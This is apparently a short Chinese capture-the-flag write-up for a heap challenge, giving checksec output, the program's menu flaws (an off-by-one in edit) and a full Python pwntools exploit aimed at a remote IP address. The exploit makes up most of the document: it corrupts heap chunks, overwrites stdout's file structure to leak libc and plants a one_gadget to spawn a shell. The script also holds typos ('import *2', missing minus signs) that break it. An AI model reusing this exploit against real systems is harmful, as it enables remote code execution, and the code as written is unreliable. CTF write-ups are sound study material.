[TOC]
# checksec 
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
# 程序流程
1. add idx[0,4] ,size(8fh,400h]
2. edi offbyone
3. delete 没有uaf 

# 思路
超过能力的题，看看师傅们的复现

unsorted bin + off by one  爆破到global_max_fast 修改值。

# exp 
```
from pwn import *2
context.log_level="debug"
def add(index,size):
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(size))


def delete(index):
    p.sendlineafter(">> ","3")
    p.sendlineafter(": ",str(index))


def edit(index,note):
    p.sendlineafter(">> ","2")
    p.sendlineafter(": ",str(index))
    p.sendafter(": ",note)

p=remote("112.126.103.195",9999)
add(0,0xf8)
add(1,0xf8)
add(2,0xe8)
add(3,0xe8)
add(4,0xe8)
delete(3)
add(3,0xe8)
add(4,0xe8)
edit(0,"a"*0xf0+p64(0x200)+"\xf1")
delete(1)
add(1,0xf8)
edit(2,"a"*8+"\xe8\x37"+"\n")
add(1,0xe8)
delete(1)
edit(2,"\xcf\x25\n")
add(1,0xe8)
add(0,0xe8)
edit(0,"a"+p64(0)*7+p64(0xf1)+p64(0xfbad1887)+p64(0)*3+"\x00"+"\n")
p.recvuntil("\x7f\x00\x00")
libc=u64(p.recv(8))-0x7ffff7dd26a3+0x7ffff7a0d000
print hex(libc)
delete(1)
edit(2,p64(libc+0x7ffff7dd26af-0x7ffff7a0d000)+"\n")
add(0,0xe8)
add(1,0xe8)
payload="a"+p64(libc-0x7ffff7a0d000+0x00007ffff7dd17a0)
payload+=p64(0)*3+p64(0xffffffff)+p64(0)*2+p64(libc0x7ffff7a0d000+0x7ffff7dd2720) 
payload+=p64(libc-0x7ffff7a0d000+0x00007ffff7dd2540)+p64(libc0x7ffff7a0d000+0x00007ffff7dd2620)+p64(libc0x7ffff7a0d000+0x00007ffff7dd18e0)+p64(libc0x7ffff7a0d000+0x00007ffff7a2db70)   
payload+=p64(libc+0xf1147)*16+"\n"
edit(1,payload)
#gdb.attach(p)
p.interactive()

```